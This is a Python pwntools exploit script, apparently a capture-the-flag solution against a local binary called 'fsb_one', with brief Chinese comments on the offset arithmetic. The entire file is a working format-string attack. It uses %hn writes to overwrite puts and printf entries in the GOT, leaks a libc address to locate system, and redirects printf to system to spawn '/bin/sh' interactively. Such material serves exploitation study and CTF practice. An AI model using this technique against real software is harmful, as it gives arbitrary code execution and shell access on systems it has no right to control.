#!/usr/bin/env python
# coding=utf-8
from pwn import *

p = process('fsb_one')  #,env = {'LD_PRELOAD' : ',.libc.so.6'})
#libc = ELF('libc.so.6')
elf = ELF('fsb_one')

puts_got = elf.got["puts"]
#puts_got = 0x601018
print hex(puts_got)
echo = 0x400806

'''
 addr[0x601018] = 0x0806
 addr[0x60101a] = 0x0040
 addr[0x60101c] = 0x0000
 addr[0x60101e] = 0x0000
 0x601018 => 0x00400806
 
'''

def s_sub(a,b):
    if a<b:
       return 0x10000 + a - b #hn,高位会被忽略掉，意思就是说  0x10000 + a - b + b = a
    return a - b 

################payload1##################

n = 6 + 8
pattern = "%{}c%{}$hn" #{}里面最大是五位数0x1000-->65536（四个字节）
#13个字符--->16 (1+5+1+1+2+1+1+1)

payload1 = ""
payload1 += pattern.format(0x806,n)
payload1 += pattern.format(s_sub(0x40,0x806),n+1)
payload1 += pattern.format(s_sub(0,0x40),n+2)
#payload += pattern.format(s_sub(0,0),n+3)
payload1 = payload1.ljust(64,"A")

payload1 += p64(0x601018)
payload1 += p64(0x60101a)
payload1 += p64(0x60101c)
#payload += p64(0x60101e)

#pause()

p.sendline(payload1)

################payload2##################

payload2 = ""
payload2 += "%144$p.%145$p.%146$p" 

#pause()

p.sendline(payload2)
p.recvuntil(".")
libc_start_main_ret = int(p.recvuntil(".",drop = True),16)
#print hex(libc_start_main_ret)
log.info("libc_start_main_ret addr: " + hex(libc_start_main_ret))

libc_base = libc_start_main_ret - 0x202e1
system_addr = libc_base + 0x3f480
printf_addr = libc_base + 0x4f190
log.info("system_addr addr: " + hex(system_addr))
log.info("printf_addr addr: " + hex(printf_addr))
print hex(elf.got["printf"])

################payload3##################

pattern = "%{}c%{}$hn" 
n = 6 + 4
system_low = system_addr & 0xffff
system_high = (system_addr >> 16) & 0xffff


log.info("system_low addr: " + hex(system_low))
log.info("system_high addr: " + hex(system_high))

payload3 = ""
payload3 += pattern.format(system_low , n)
payload3 += pattern.format(s_sub(system_high ,system_low) , n+1)
payload3 = payload3.ljust(32 , "B")

payload3 += p64(elf.got["printf"])
payload3 += p64(elf.got["printf"] + 2)

pause()

p.sendline(payload3)

################getshell##################

p.sendline("/bin/sh\x00")

p.interactive()
